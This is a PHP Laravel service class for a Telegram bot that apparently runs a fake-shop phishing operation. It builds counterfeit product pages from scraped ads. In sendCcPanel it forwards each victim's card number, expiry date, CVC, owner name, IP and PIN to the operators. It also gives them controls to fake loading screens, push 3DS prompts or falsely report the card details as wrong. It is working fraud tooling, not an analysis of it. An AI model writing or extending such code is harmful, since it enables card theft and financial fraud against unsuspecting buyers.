<?php

namespace App\Services;

use App\Exceptions\TelegramException;
use App\Models\PaymentSession;
use App\Models\PaymentWindow;
use App\Models\ProductPage;
use App\TelegramCommands\CallbackqueryCommand;
use App\TelegramCommands\CreateProductPageCommand;
use App\TelegramCommands\GenericMessageCommand;
use App\TelegramCommands\HelpCommand;
use App\TelegramCommands\StartCommand;
use Illuminate\Support\Facades\Storage;
use Log;
use Longman\TelegramBot\Entities\Chat;
use Longman\TelegramBot\Entities\InlineKeyboard;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Telegram;
use Str;
use Throwable;
use function config;
use function json_encode;
use function route;
use function rtrim;
use function trim;

class TelegramService
{
    private Telegram $client;

    public function __construct()
    {
        $this->client = new Telegram(config('telegram.bot_token'), config('telegram.bot_username'));

        $this->registerCommands();
        $this->registerDownloadAndUploadPaths();
    }

    public function isChatIdAdmin($chatId): bool
    {
        if (empty($chatId)) return false;
        return in_array($chatId, config('telegram.admin_telegram_ids'));
    }

    public function getHelpText(string $chatId): string
    {
        return <<<HELP
        *Commands*
        You can control this bot by sending these commands:

        /help - Show bot commands help
        /create URL - Grab this ad and create a new product page from it

        To use this bot, your Telegram ID has to be added in the .env file.
        *Your Telegram ID is: $chatId*
        HELP;
    }

    public function sendMessage(string $chatId, string $message)
    {
        Request::sendMessage([
            'chat_id' => $chatId,
            'text' => $message
        ]);
    }

    public function sendMessageWithUrlButton(string $chatId, string $message, string $buttonLabel, string $buttonUrl)
    {

        $keyboardEntries = [
            [
                ['text' => $buttonLabel, 'url' => $buttonUrl]
            ]
        ];

        $inlineKeyboard = new InlineKeyboard(...$keyboardEntries);

        $inlineKeyboard = $inlineKeyboard
            ->setResizeKeyboard(true)
            ->setOneTimeKeyboard(false)
            ->setSelective(false);

        $serverResponse = Request::sendMessage([
            'chat_id' => $chatId,
            'text' => $message . "\n‎ ",
            'parse_mode' => 'markdown',
            'reply_markup' => $inlineKeyboard,
        ]);
    }

    public function sendRawKeyboard(string $chatId, string $message, $keyboard)
    {
        $serverResponse = Request::sendMessage([
            'chat_id' => $chatId,
            'text' => $message . "\n‎ ",
            'parse_mode' => 'markdown',
            'reply_markup' => $keyboard,
        ]);
    }

    public function sendMessageSilent($chatId, string $message): void
    {
        try {
            $this->sendMessage($chatId, $message);
        } catch (Throwable $exception) {
        }
    }

    public function sendMessageSilentToAdmins($chatId, string $message): void
    {
        $chatIds = config('telegram.admin_telegram_ids');
        foreach ($chatIds as $chatId) {
            if (empty($chatId)) continue;
            $this->sendMessageSilent($chatId, $message);
        }
    }

    public function sendMessageWithUrlButtonSilent($chatId, string $message, string $buttonLabel, string $buttonUrl): void
    {
        try {
            $this->sendMessageWithUrlButton($chatId, $message, $buttonLabel, $buttonUrl);
        } catch (Throwable $exception) {
        }
    }

    public function sendRawKeyboardSilent($chatId, string $message, $keyboard): void
    {
        try {
            $this->sendRawKeyboard($chatId, $message, $keyboard);
        } catch (Throwable $exception) {
        }
    }

    public function sendMessageWithUrlButtonSilentToAdmins($message, string $buttonLabel, string $buttonUrl): void
    {
        $chatIds = config('telegram.admin_telegram_ids');
        foreach ($chatIds as $chatId) {
            if (empty($chatId)) continue;
            $this->sendMessageWithUrlButtonSilent($chatId, $message, $buttonLabel, $buttonUrl);
        }
    }

    public function sendRawKeyboardSilentToAdmins($message, $keyboard): void
    {
        $chatIds = config('telegram.admin_telegram_ids');
        foreach ($chatIds as $chatId) {
            if (empty($chatId)) continue;
            $this->sendRawKeyboardSilent($chatId, $message, $keyboard);
        }
    }

    public function sendPhoto(string $chatId, string $imageUrl)
    {
        Request::sendPhoto([
            'chat_id' => $chatId,
            'photo' => $imageUrl
        ]);
    }

    public function sendCcPanel(ProductPage $productPage, PaymentSession $paymentSession, PaymentWindow $paymentWindow): void
    {
        $keyboardEntries = [];
        $keyboardEntries[] = [['text' => 'Show Admin Panel', 'url' => $paymentWindow->getNovaUrl()]];
        $keyboardEntries[] = [['text' => '♻️ Refresh', 'callback_data' => "payment_window.{$paymentWindow->id}.refresh"]];
        $keyboardEntries[] = [['text' => '🕓 Show loading screen', 'callback_data' => "payment_window.{$paymentWindow->id}.show_loading_screen"]];
        $keyboardEntries[] = [['text' => '🐙 Redirect to 3DS', 'callback_data' => "payment_window.{$paymentWindow->id}.redirect_to_3ds"]];
        $keyboardEntries[] = [['text' => '⚠️ Confirm 3DS again', 'callback_data' => "payment_window.{$paymentWindow->id}.confirm_again"]];
        $keyboardEntries[] = [['text' => '❌ CC Infos wrong', 'callback_data' => "payment_window.{$paymentWindow->id}.cc_infos_wrong"]];
        $keyboardEntries[] = [['text' => '✅ Payment successful', 'callback_data' => "payment_window.{$paymentWindow->id}.success"]];

        $inlineKeyboard = new InlineKeyboard(...$keyboardEntries);
        $inlineKeyboard = $inlineKeyboard
            ->setResizeKeyboard(true)
            ->setOneTimeKeyboard(false)
            ->setSelective(false);

        $priceToPay = number_format($productPage->price + ($productPage->fees * $productPage->price) + ($productPage->shipping_price ?? 0), 2, ',', '.');
        $vicLastPoll = $paymentWindow->last_vic_poll->format('d.m.y H:i:s');

        $initLoading = $paymentWindow->show_fullscreen_spinner ? 'yes':'no';
        $show3Ds = $paymentWindow->show_wait_for_confirmation ? 'yes':'no';
        $errorFor3Ds = empty($paymentWindow->wait_for_confirmation_error) ? '-/-' : $paymentWindow->wait_for_confirmation_error;
        $closedWithError = $paymentWindow->close_window_with_error ? 'yes':'no';
        $showSuccess = $paymentWindow->show_success ? 'yes':'no';

        $paymentWindowInfos = "*Initial loading:* {$initLoading}\n*Show 3DS:* {$show3Ds}\n*3DS error:* {$errorFor3Ds}\n*Closed with error:* {$closedWithError}\n*Show success:* {$showSuccess}";

        app(TelegramService::class)->sendRawKeyboardSilentToAdmins(
            Str::replace('_', '\_', "*ATTENTION: Credit card payment started*\n\nVic has added his credit card and wants to pay now!\n\n*Product:* {$paymentSession->productPage->title}\n*PIN:* {$productPage->pin_code}\n*Status:* {$paymentSession->status}\n*IP:* {$paymentSession->ip}\n\n*Payment window id:* {$paymentWindow->payment_window_id}\n*Price to pay:* {$priceToPay} €\n\n*CC owner:* {$paymentWindow->cc_owner}\n*CC number:* {$paymentWindow->cc_number}\n*CC date:* {$paymentWindow->cc_expiration_date}\n*CC cvc:* {$paymentWindow->cc_cvc}\n\n{$paymentWindowInfos}\n\n*Vic last seen:* {$vicLastPoll}"),
            $inlineKeyboard
        );
    }

    public function getUsernameByChat(Chat $chat): string
    {
        if (!empty($chat->getUsername())) {
            return $chat->getUsername();
        }
        return $this->getFullNameByChat($chat);
    }

    public function getFullNameByChat(Chat $chat): string
    {
        if (!empty($chat->getFirstName()) || !empty($chat->getLastName())) {
            $firstname = $chat->getFirstName() ?: '';
            $lastname = $chat->getLastName() ?: '';

            return trim($firstname . ' ' . $lastname);
        }

        return (string)$chat->getId();
    }

    public function getUsernameByChatId(string $chatId): string
    {
        $chat = $this->getChatById($chatId);
        return $this->getUsernameByChat($chat);
    }

    public function getFullNameByChatId(string $chatId): string
    {
        $chat = $this->getChatById($chatId);
        return $this->getFullNameByChat($chat);
    }

    public function getChatById(string $chatId): Chat
    {
        $response = Request::getChat([
            'chat_id' => $chatId
        ]);
        if (!$response->isOk()) {
            throw new TelegramException("Unable to get chat by chat id {$chatId}! Error {$response->getErrorCode()}: {$response->toJson()}");
        }
        return $response->getResult();
    }

    public function getBotUsername(): string
    {
        return Request::getMe()->getResult()->username;
    }

    public function testAuthToken(string $expectedUsername): bool
    {
        $response = Request::getMe();

        if (!$response->isOk()) throw new TelegramException("{$response->getErrorCode()}: {$response->getDescription()}");

        return $response->getResult()?->username == $expectedUsername;
    }

    public function buildBotChatUrl(): string
    {
        $username = $this->client->getBotUsername();
        return "https://t.me/{$username}";
    }

    private function registerDownloadAndUploadPaths()
    {
        $downloadPath = Storage::disk('public')->path("telegram/");
        $this->client->setDownloadPath($downloadPath);
    }

    public function installWebhook(): string
    {
        $url = rtrim(config('telegram.webhook_url'), '/') . route('webhooks.telegram', [], false);
        Log::info('Set Telegram webhook to ' . $url);

        $response = $this->client->setWebhook($url);
        if (!$response->isOk()) {
            throw new TelegramException("The installation of the webhook failed! Error {$response->getErrorCode()}: {$response->toJson()}");
        } else {
            Log::info(json_encode($response));
            return $response->getDescription();
        }
    }

    /**
     * @return string The description of the response. Normally you can ignore this.
     * @throws TelegramException
     * @throws \Longman\TelegramBot\Exception\TelegramException
     */
    public function uninstallWebhook(): string
    {
        $response = $this->client->deleteWebhook();

        if (!$response->isOk()) {
            throw new TelegramException("The uninstallation of the webhook failed! Error {$response->getErrorCode()}: {$response->toJson()}");
        } else {
            return $response->getDescription();
        }
    }

    public function handleWebhook()
    {
        $this->client->handle();
    }

    private function registerCommands()
    {
        $this->client->addCommandClasses([
            StartCommand::class,
            HelpCommand::class,
            CreateProductPageCommand::class,

            GenericMessageCommand::class,
            CallbackqueryCommand::class,
        ]);
    }

}
